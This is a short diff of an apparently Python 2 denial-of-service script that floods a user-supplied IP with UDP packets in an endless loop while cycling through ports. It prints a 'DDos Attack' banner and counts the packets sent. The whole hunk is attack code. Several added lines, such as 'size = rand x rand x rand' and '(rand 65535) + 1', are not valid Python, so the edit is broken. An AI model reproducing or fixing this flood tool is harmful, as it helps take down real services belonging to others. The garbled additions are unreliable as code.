@@ -27,10 +27,12 @@ port = input("Port : ")
 os.system("clear")
 os.system("figlet DDos Attack")
 sent = 0
+randpackets:
 while True:
+     size = rand x rand x rand 
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s port:%s"%(sent,port)
-     if port == 65535:
+     print "succeed %s ! packet %s port:%s"%(sent,port)
+     if port == (rand 65535) + 1 :
        port = 1
